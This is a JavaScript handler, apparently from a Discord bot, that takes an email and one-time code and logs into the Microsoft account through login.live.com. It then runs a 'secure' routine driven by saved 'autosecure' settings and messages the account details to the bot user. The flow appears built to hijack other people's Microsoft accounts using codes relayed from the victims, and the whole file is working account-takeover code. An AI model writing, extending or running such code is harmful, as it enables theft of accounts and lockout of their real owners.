const validEmail = require("../../utils/validEmail");
const axios = require("axios");
const login = require("../../utils/login");
const secure = require("../../utils/secure");
const listAccount = require("../../utils/listAccount");
const { queryParams } = require("../../../db/db");

module.exports = {
    name: "otpsecure",
    userOnly: true,
    callback: async (client, interaction) => {
        let email = interaction.components[0].components[0].value;
        let otp = interaction.components[1].components[0].value;
        if (!(validEmail(email))) {
            return interaction.reply({ content: `Invalid Email/Security Email`, ephemeral: true })
        }
        if (isNaN(otp) || otp.length < 6 || otp.length > 7) {
            return interaction.reply({ content: `Invalid OTP`, ephemeral: true })
        }
        let settings = await queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [client.username])
        if (settings.length == 0) {
            return interaction.reply({
                embeds: [{
                    title: `Error :x:`,
                    description: `Unexpected error occured!`,
                    color: 0xff0000
                }],
                ephemeral: true
            })
        }
        settings = settings[0]
        const { data } = await axios({
            method: "GET",
            url: `https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&scope=openid&redirect_uri=https://www.office.com/landingv2&response_type=code&msproxy=1&username=${email}`,
        })
        const mat = data.match(/{"Username":.+?(}},)/);
        let profiles
        if (mat && mat[0]) {
            profiles = JSON.parse(mat[0].replace("}},", "}}"))
        } else {
            return interaction.reply({ content: `Invalid Email!`, ephemeral: true })
        }
        if (!profiles?.Credentials?.OtcLoginEligibleProofs) {
            return interaction.reply({ content: `No Security Emails in that email!`, ephemeral: true })
        }
        if (!profiles?.Credentials?.OtcLoginEligibleProofs) {
            return interaction.reply({ content: `This email doesn't have any security emails!`, ephemeral: true })
        }
        await interaction.reply({ content: `Trying to login!`, ephemeral: true })

        for (let sec of profiles?.Credentials?.OtcLoginEligibleProofs) {
            let host = await login({ email: email, id: sec.data, code: otp })
            if (host) {
                interaction.editReply(`Securing!`)
                let acc = await secure(host, settings)
                let msg = await listAccount(acc)
                interaction.editReply(msg)
                interaction.user.send(msg)
            }
        }
        interaction.editReply(`Failed to login!`)

    }
}